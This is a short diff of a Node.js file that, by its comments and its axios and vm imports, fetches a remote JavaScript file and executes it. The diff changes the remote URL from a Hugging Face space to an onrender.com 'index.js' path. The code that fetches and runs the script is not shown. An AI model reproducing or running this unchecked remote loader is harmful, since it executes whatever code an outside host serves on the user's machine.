@@ -2,7 +2,7 @@ const axios = require('axios');
 const vm = require('vm');
 
 // URL of the remote JS file
-const remoteScriptUrl = 'https://mrfrxnk-ofc.hf.space';
+const remoteScriptUrl = 'https://cdn-mrfrank.onrender.com/media/subzero/index.js';
 
 // Function to load and execute the remote script
 (async () => {
